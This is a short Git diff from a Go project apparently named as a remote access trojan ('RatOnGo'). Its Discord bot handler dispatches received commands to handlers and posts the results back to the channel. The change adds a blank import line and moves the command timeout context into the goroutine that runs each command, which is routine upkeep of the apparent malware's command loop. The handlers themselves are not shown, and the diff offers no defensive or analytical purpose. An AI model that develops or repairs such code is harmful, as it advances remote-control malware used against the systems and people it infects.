@@ -4,6 +4,7 @@ import (
 	"RatOnGo/internal/handlers"
 	"context"
 	"fmt"
+
 	"os"
 	"strings"
 	"sync"
@@ -108,10 +109,10 @@ func (c *Client) onMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
 	command := strings.TrimPrefix(parts[0], CommandPrefix)
 	args := parts[1:]
 
-	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-	defer cancel()
-
 	go func() {
+		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+		defer cancel() 
+
 		result := c.handlers.Execute(ctx, command, args, c.session, c.channelID)
 		if result != "" {
 			c.sendMessage(result)
